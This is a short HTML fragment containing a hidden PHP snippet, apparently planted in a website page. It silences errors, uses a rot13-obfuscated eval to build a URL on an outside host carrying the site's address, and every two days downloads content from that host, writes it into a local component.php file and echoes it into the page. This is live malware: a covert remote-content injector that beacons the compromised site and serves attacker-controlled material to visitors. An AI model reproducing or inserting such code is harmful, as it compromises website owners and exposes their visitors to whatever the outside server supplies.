<p class="nocl">
<?php
	error_reporting(0);
	ini_set('display_errors',0);
	$url = "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']; 
	$url = str_replace("&", "",$url);
	$nonhttp = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	$target = dirname(__FILE__) . DIRECTORY_SEPARATOR . "component.php";
  	$cachetime = 2 * 24 * 60 * 60; //2 * 24 * 60 * 60
	if ((file_exists($target)) && (time() - $cachetime) > filemtime($target)) {    
		eval(str_rot13('$fbhepr = "uggc://shvan.pbz/o/r1.cuc?fvgr=".$abauggc;'));
		$string = str_rot13(file_get_contents($source));
		$result = file_put_contents($target, $string);
		}
	echo str_rot13 (file_get_contents($target));
	
?>
</p>